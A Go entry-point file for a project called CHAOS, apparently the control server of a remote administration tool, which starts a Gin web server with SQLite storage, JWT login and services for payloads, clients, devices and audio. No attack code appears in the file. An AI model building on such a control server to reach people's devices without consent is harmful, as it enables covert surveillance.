package main

import (
	"fmt"
	"net/http"

	"github.com/gin-gonic/gin"
	"github.com/jinzhu/gorm"
	"github.com/justadoll/CHAOS/infrastructure/database"
	"github.com/justadoll/CHAOS/internal/environment"
	"github.com/justadoll/CHAOS/internal/middleware"
	"github.com/justadoll/CHAOS/internal/utils/constants"
	"github.com/justadoll/CHAOS/internal/utils/system"
	"github.com/justadoll/CHAOS/internal/utils/template"
	"github.com/justadoll/CHAOS/internal/utils/ui"
	httpDelivery "github.com/justadoll/CHAOS/presentation/http"
	"github.com/justadoll/CHAOS/repositories/sqlite"
	"github.com/justadoll/CHAOS/services/audio"
	"github.com/justadoll/CHAOS/services/auth"
	"github.com/justadoll/CHAOS/services/client"
	"github.com/justadoll/CHAOS/services/device"
	"github.com/justadoll/CHAOS/services/payload"
	"github.com/justadoll/CHAOS/services/url"
	"github.com/justadoll/CHAOS/services/user"
	"github.com/sirupsen/logrus"
)

const AppName = "CHAOS"

var Version = "dev"

type App struct {
	Logger        *logrus.Logger
	Configuration *environment.Configuration
	Router        *gin.Engine
}

func init() {
	_ = system.ClearScreen()
}

func main() {
	logger := logrus.New()
	logger.Info(`Loading environment variables`)

	if err := Setup(); err != nil {
		logger.WithField(`cause`, err.Error()).Fatal(`error running setup`)
	}

	configuration := environment.Load()
	if err := configuration.Validate(); err != nil {
		logger.WithField(`cause`, err.Error()).Fatal(`error validating environment config variables`)
	}

	dbClient, err := database.NewSqliteClient(constants.DatabaseDirectory, configuration.Database.Name)
	if err != nil {
		logger.WithField(`cause`, err).Fatal(`error connecting with database`)
	}

	if err := NewApp(logger, configuration, dbClient.Conn).Run(); err != nil {
		logger.WithField(`cause`, err).Fatal(fmt.Sprintf("failed to start %s Application", AppName))
	}
}

func NewApp(logger *logrus.Logger, configuration *environment.Configuration, dbClient *gorm.DB) *App {
	//repositories
	authRepository := sqlite.NewAuthRepository(dbClient)
	userRepository := sqlite.NewUserRepository(dbClient)
	deviceRepository := sqlite.NewDeviceRepository(dbClient)

	//services
	payloadService := payload.NewPayloadService()
	authService := auth.NewAuthService(logger, configuration.SecretKey, authRepository)
	userService := user.NewUserService(userRepository)
	deviceService := device.NewDeviceService(deviceRepository)
	clientService := client.NewClientService(Version, authRepository, payloadService, authService)
	urlService := url.NewUrlService(clientService)
	audioService := audio.NewAudioService(clientService)

	//router
	router := gin.Default()
	router.Use(gin.Recovery())
	router.Static("/static", "web/static")
	router.HTMLRender = template.LoadTemplates("web")

	setup, err := authService.Setup()
	if err != nil {
		logger.WithField(`cause`, err).Fatal(`error preparing authentication`)
	}
	jwtMiddleware, err := middleware.NewJWTMiddleware(setup.SecretKey, userService)
	if err != nil {
		logger.WithField(`cause`, err).Fatal(`error creating jwt middleware`)
	}
	if err := userService.CreateDefaultUser(); err != nil {
		logger.WithField(`cause`, err).Fatal(`error creating default user`)
	}

	httpDelivery.NewController(
		configuration,
		router,
		logger,
		jwtMiddleware,
		clientService,
		authService,
		payloadService,
		userService,
		deviceService,
		urlService,
		audioService,
	)

	return &App{
		Configuration: configuration,
		Logger:        logger,
		Router:        router,
	}
}

func Setup() error {
	return system.CreateDirs(constants.TempDirectory, constants.DatabaseDirectory)
}

func (a *App) Run() error {
	ui.ShowMenu(Version, a.Configuration.Server.Port)

	a.Logger.WithFields(
		logrus.Fields{`version`: Version, `port`: a.Configuration.Server.Port}).Info(`Starting `, AppName)

	return http.ListenAndServe(
		fmt.Sprintf(":%s", a.Configuration.Server.Port),
		http.TimeoutHandler(a.Router, constants.TimeoutDuration, constants.TimeoutExceeded))
}
